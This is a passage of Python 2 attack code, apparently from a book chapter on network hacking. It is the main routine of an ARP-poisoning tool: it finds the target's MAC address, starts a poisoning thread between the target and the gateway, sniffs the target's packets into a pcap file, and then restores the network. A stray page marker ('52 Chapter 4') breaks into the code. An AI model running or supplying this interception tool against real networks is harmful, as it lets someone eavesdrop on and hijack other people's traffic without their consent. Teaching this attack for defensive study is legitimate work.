target_mac = get_mac(target_ip)

if target_mac is None:
  print "[!!!] Failed to get target MAC. Exiting."
  sys.exit(0)
else:
  print "[*] Target %s is at %s" % (target_ip,target_mac)
# start poison thread
  poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac))
  poison_thread.start()
  
try:
  print "[*] Starting sniffer for %d packets" % packet_count
  52   Chapter 4
  bpf_filter = "ip host %s" % target_ip
  packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)# write out the captured packets
  wrpcap('arper.pcap',packets)
  # restore the network
  restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
  
except KeyboardInterrupt:
  # restore the network
  restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
  sys.exit(0)
